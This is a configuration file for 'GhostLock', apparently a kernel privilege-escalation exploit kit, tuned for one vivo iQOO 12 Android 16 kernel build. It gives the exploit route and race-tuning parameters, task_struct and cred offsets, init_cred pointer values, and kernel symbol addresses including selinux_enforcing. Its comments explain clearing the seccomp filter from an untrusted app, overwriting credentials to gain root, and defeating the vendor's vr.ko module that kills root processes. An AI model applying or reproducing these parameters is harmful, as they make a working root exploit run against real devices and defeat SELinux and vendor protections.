# GhostLock kernel profile: 6.1.145-android14-11-maybe-dirty (HOCON).
#
# vivo iQOO 12 (V2307A / PD2307), OriginOS 6 / Android 16,
# firmware PD2307_A_16.2.20.3.W10.V000L1 (security patch 2026-08-01).
#
# This build is vendor-anti-matched: /proc/version reports the placeholders
# build-user@build-host and an epoch-0 timestamp, so it matches no other entry
# and cannot be looked up from a public OTA. Its symbol offsets differ from the
# registered "6.1.145-android14-11-g74d1702dab4d-ab14669069" entry by 1.1-3.1 MB
# (selinux_enforcing 0x02249400 -> 0x02558f40); reusing that entry writes W1 to
# the wrong address and resets the SoC watchdog.
#
# Route: multicast_waiter. pselect is statically infeasible on this kernel
# (derived pselect/futex overlap is -216: do_pselect is inlined by PGO, so the
# select chain is shallower than the futex chain and no non-negative waiter
# shift reaches it), and the TCP route's 0x40-byte copy is too shallow to cover
# the stale waiter's task/lock fields. The multicast copy is 0x108 bytes.
# fallback = none for the same reason: a fallback would run a route that panics.
include "credential-6x.conf"
include "kernelsnitch-6x.conf"
release = "6.1.145-android14-11-maybe-dirty"
schema_version = 1
kernel_major = 6
# Measured on this device (2026-09-30): the direct path completes without
# Shizuku — it runs as untrusted_app, W3 clears the seccomp filter, and the
# iomem cache the app seeds supplies the multicast geometry. That is the better
# default here: Shizuku cannot auto-start after a reboot, so requiring it costs
# a manual step every session, while the direct path can be retried freely.
recommend_shizuku = 0
# Ancillary vr.ko guard (docs/analysis/ancillary-controller-guide.md): vivo's
# vr.ko kills any process that holds uid 0 on its next sys_exit, which is what
# takes ksud and the shells it spawns down. The gate enables the behavior; the
# runtime check for vr.ko in /proc/modules happens on the device.
recommend_vr_guard = 1
route {
  multicast_waiter {
    waiter_off = 96
    buffer_size = 264
    task_offset = 48
    lock_offset = 56
    compact_waiter = 1
    # Poison/walk repetition, from the reference kit's working configuration on
    # this kernel line. One setsockopt is one lottery ticket (the copy races skb
    # page recycling); the arm starts only after the earlier copies have
    # overwritten each other, and the waiter thread holds on yield until the
    # consumer has walked. 0 or an omitted key keeps the compiled-in default.
    attempts = 128
    arm_sequence = 16
    arm_hold = 20000
  }
}
fallback {
  to = "none"
}
execution {
  # Reference-kit measurement for this kernel line: the pair straddling the
  # 3.15/2.96 GHz clusters is stable across runs, unlike the 0/1 default.
  # The app offers it as the default pair (and adds it to the list when the
  # per-cluster pairing cannot express it) until the user picks one; an
  # explicit choice — and the `selected_cpus` it produces — still wins.
  recommended_cpus {
    main = 4
    consumer = 5
  }
  heap {
    # The reference kit's working config on this kernel line retries kernel
    # page preparation 12 times ("prepare_kernel_page retry 1/12" in its
    # success logs). The shared default of 4 exhausts after a handful of
    # "page stores an even byte over selinux_state.initialized" refusals and
    # aborts the run before the route is even reached, which is one of the two
    # failure modes seen on this device.
    prepare_max_attempts = 12
  }
}
kernelsnitch {
  mm_struct_sz = 1024
  collisions = 8
}
task_struct {
  prio = 132
  normal_prio = 140
  sched_task_group = 840
  pi_lock = 2340
  pi_waiters = 2360
  pi_top_task = 2376
  pi_blocked_on = 2384
  pid = 1584
  tgid = 1588
  atomic_flags = 1520
  real_cred = 2096
  cred = 2104
  comm = 2120
  tasks = 1360
  seccomp = 2304
}
# offsetof(struct tracepoint, funcs), read from this image's BTF. Not derived
# from the release: 6.6 added probestub ahead of funcs and moved it to 0x48.
vr_guard {
  tracepoint_funcs = 64
}
cred {
  # multicast requires copy_size >= 0xa0; this kernel's sizeof(struct cred) is
  # 0xa0 (ref3_offset 152 + 8), so the shared 136-byte template is too small.
  copy_size = 176
  ref_count = 4
  ref0_offset = 128
  ref1_offset = 136
  ref2_offset = 144
  ref3_offset = 152
  # init_cred's pointer fields, read out of this device's own kernel image
  # (root_user / init_user_ns / init_ucounts / init_groups).
  ref0_image = -274708098616
  ref1_image = -274708099280
  ref2_image = -274708092296
  ref3_image = -274708093720
}
offset {
  init_task = 35519488
  init_cred = 35595504
  empty_zero_page = 37859328
  root_task_group = 37889856
  selinux_enforcing = 39161664
  selinux_blob_sizes = 24049752
  security_hook_heads = 24047944
  slide_nfulnl_logger = 35467160
  slide_loggers_0_1 = 35466984
  slide_boot_id = 39298376
  vr_sys_exit_tp = 37532032
}
